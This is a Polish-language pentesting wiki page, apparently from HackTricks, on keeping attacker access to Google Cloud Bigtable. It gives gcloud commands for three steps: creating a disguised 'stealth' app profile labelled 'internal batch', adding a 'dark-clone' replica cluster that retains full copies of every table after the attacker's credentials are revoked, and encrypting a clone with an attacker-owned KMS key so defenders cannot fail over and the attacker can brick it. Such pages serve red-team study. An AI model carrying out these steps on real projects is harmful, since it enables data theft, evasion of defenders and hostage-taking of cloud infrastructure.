# GCP - Bigtable Utrzymywanie dostępu

{{#include ../../../banners/hacktricks-training.md}}

## Bigtable

Aby uzyskać więcej informacji o Bigtable, zobacz:

{{#ref}}
../gcp-services/gcp-bigtable-enum.md
{{#endref}}

### Dedicated attacker App Profile

**Uprawnienia:** `bigtable.appProfiles.create`, `bigtable.appProfiles.update`.

Utwórz app profile, który kieruje ruch do twojego klastra repliki i włącz Data Boost, aby nie zależeć od przydzielonych węzłów, które obrońcy mogliby zauważyć.

<details>

<summary>Create stealth app profile</summary>
```bash
gcloud bigtable app-profiles create stealth-profile \
--instance=<instance-id> --route-any --restrict-to=<attacker-cluster> \
--row-affinity --description="internal batch"

gcloud bigtable app-profiles update stealth-profile \
--instance=<instance-id> --data-boost \
--data-boost-compute-billing-owner=HOST_PAYS
```
</details>

Tak długo, jak ten profil istnieje, możesz się ponownie połączyć, używając nowych poświadczeń, które się do niego odnoszą.

### Utrzymaj własny klaster repliki

**Uprawnienia:** `bigtable.clusters.create`, `bigtable.instances.update`, `bigtable.clusters.list`.

Utwórz klaster z minimalną liczbą węzłów w mało aktywnym regionie. Nawet jeśli Twoje tożsamości klienta zostaną usunięte, **klaster zachowa pełną kopię każdej tabeli** dopóki obrońcy jej nie usuną.

<details>

<summary>Utwórz klaster repliki</summary>
```bash
gcloud bigtable clusters create dark-clone \
--instance=<instance-id> --zone=us-west4-b --num-nodes=1
```
</details>

Monitoruj to za pomocą `gcloud bigtable clusters describe dark-clone --instance=<instance-id>` dzięki czemu możesz natychmiast zwiększyć skalę, gdy będziesz musiał pobrać dane.

### Zablokuj replikację za pomocą własnego CMEK

**Uprawnienia:** `bigtable.clusters.create`, `cloudkms.cryptoKeyVersions.useToEncrypt` na kluczu należącym do atakującego.

Użyj własnego klucza KMS przy tworzeniu clone'a. Bez tego klucza Google nie będzie w stanie odtworzyć ani przełączyć klastra, więc blue teams muszą się z tobą skoordynować przed podjęciem działań.

<details>

<summary>Utwórz klaster chroniony CMEK</summary>
```bash
gcloud bigtable clusters create cmek-clone \
--instance=<instance-id> --zone=us-east4-b --num-nodes=1 \
--kms-key=projects/<attacker-proj>/locations/<kms-location>/keyRings/<ring>/cryptoKeys/<key>
```
</details>

Obróć lub wyłącz klucz w swoim projekcie, aby natychmiast zbrickować replikę (z możliwością ponownego jej włączenia później).

{{#include ../../../banners/hacktricks-training.md}}
